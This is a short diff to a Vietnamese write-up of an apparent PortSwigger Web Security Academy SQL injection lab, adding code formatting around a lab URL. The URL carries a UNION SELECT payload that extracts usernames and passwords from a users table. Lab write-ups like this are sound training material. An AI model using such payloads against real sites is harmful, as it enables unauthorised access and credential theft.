@@ -10,7 +10,9 @@
 
 Ok web load ổn, chúng ta sẽ tiến hành select username và password từ bảng **users**
 
+```markdown
 https://acd51f7e1f13167e80c95424009300ec.web-security-academy.net/filter?category=Corporate+gifts%27+UNION+SELECT+username,password+FROM+users--
+```
 
 ![](/imgs/SQL-Injection/7.png?raw=true)
 
